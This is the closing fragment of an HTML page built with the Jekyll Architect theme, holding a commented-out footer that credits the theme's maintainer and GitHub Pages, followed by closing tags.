          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
